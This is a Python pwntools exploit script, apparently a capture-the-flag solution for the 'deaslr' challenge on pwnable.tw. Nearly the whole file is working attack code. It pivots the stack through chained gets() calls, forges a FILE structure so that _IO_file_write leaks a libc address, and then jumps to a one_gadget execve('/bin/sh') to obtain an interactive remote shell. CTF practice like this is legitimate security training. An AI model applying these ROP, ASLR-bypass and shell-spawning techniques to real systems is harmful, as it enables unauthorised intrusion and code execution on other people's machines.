#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\0"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
A = lambda len=1, c=b'A': c * len
z = lambda len=1, c=b'\0': c * len

exe = ELF("deaslr_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.23.so", checksec=False)

context.terminal = ["/mnt/c/Windows/system32/cmd.exe", "/c", "start", "wt.exe", "-w", "0", "split-pane", "-V", "-s", "0.5", "wsl.exe", "-d", "Ubuntu-24.04", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
set follow-fork-mode parent
set detach-on-fork on
# b *main+30
b *__libc_csu_init+73
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.25)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10402
        return remote(host, port)

pop_rbx_rbp_r12_r13_r14_r15_ret = 0x4005ba
pop_rdi_ret = 0x4005c3
pop_rsi_r15_ret = 0x4005c1
nop_ret = 0x4005c8
leave_ret = 0x400554
call = 0x4005a0

stack_1 = 0x601400
stack_2 = stack_1 + 0x400
fake_file = stack_2 + 0x58
stdin_addr = stack_1 - 0x60

attempt = 0
while True:
    attempt += 1
    print("\n----------> Attempt", attempt)

    p = conn()

    print("1st write -> ROP at main() return")
    # First ROP
    pl = flat(
        A(0x10),
        stack_1, # saved rbp

        pop_rdi_ret,
        stack_1,
        exe.symbols['gets'], # 2nd write
        
        leave_ret # rsp -> stack 1, rbp -> stack 2
    )
    sl(p, pl)

    sleep(0.1)

    print("2nd write -> ROP at stack 1")
    # ROP at stack 1
    pl = flat(
        stack_2, # saved rbp
        exe.symbols['main'], # 3rd write
        leave_ret, # rsp -> stack 2, rbp -> stdin_addr - 0x20
    )

    # Padding
    pl += p64(0) * ((stack_2 - stack_1 - 0x18)//8)

    # ROP at stack 2
    pl += flat(
        stdin_addr - 0x20, # saved rbp

        pop_rdi_ret,
        stdin_addr + 0x8,
        exe.symbols['gets'], # 4th write

        pop_rdi_ret,
        stdin_addr - 0x18,
        exe.symbols['gets'],  # 5th write

        pop_rdi_ret,
        stack_1,
        exe.symbols['gets'], # 6th write

        leave_ret, # rsp -> stdin_addr - 0x20
    )

    # Fake FILE structure
    # __fileno = 1, __flags2 = 2 (write syscall can't be canceled)
    pl += flat(z(0x70), 1, 2)

    sl(p, pl)

    sleep(0.1)

    print("3rd write -> STDIN address at stack 1 - 0x60")
    sl(p, b'A')

    '''
    4005a0:	4c 89 ea             	mov    rdx,r13
    4005a3:	4c 89 f6             	mov    rsi,r14
    4005a6:	44 89 ff             	mov    edi,r15d
    4005a9:	41 ff 14 dc          	call   QWORD PTR [r12+rbx*8]
    '''
    print("4th write -> ROP under STDIN address")
    pl = flat(
        100, # r13 -> rdx
        exe.got['gets'], # r14 -> rsi
        fake_file, # r15 -> rdi
        call # _IO_file_write
    )
    sl(p, pl)

    print("5th write -> ROP above STDIN address")
    '''
    tele 0x70dc813c0000+0x4eb*8
    0x70dc813c2758 (__GI__IO_file_jumps+120) —▸ 0x70dc81078b70 (_IO_file_write@@GLIBC_2.2.5)
    '''
    pl = flat(
        pop_rbx_rbp_r12_r13_r14_r15_ret,
        0x4eb, # rbx
        0x4ec, # rbp = rbx + 1, to return
        b'\0', # Overwrite last byte -> _nl_C_LC_TIME+160
    )
    sl(p, pl)

    print("6th write -> to have another gets() after leaking libc")
    pl = flat(
        pop_rdi_ret,
        stack_1 + 0x18,
        exe.plt['gets'] # 7th write
    )
    sl(p, pl)

    sleep(0.5)

    try:
        libc.address = leak_bytes(rn(p, 6), libc.symbols['gets'])
        lg("libc base", libc.address)
    except:
        print("Failed attempt")
        p.close()
        continue
    
    '''
    0x4526a execve("/bin/sh", rsp+0x30, environ)
    constraints:
    [rsp+0x30] == NULL
    '''
    one_gadget = libc.address + 0x4526a
    lg("one gadget", one_gadget)
    print("7th write -> one_gadget")
    pl = flat(
        one_gadget,
        p64(0) * 5
    )
    sl(p, pl)

    rr(p, 0.5)
    ia(p)
    p.close()
    break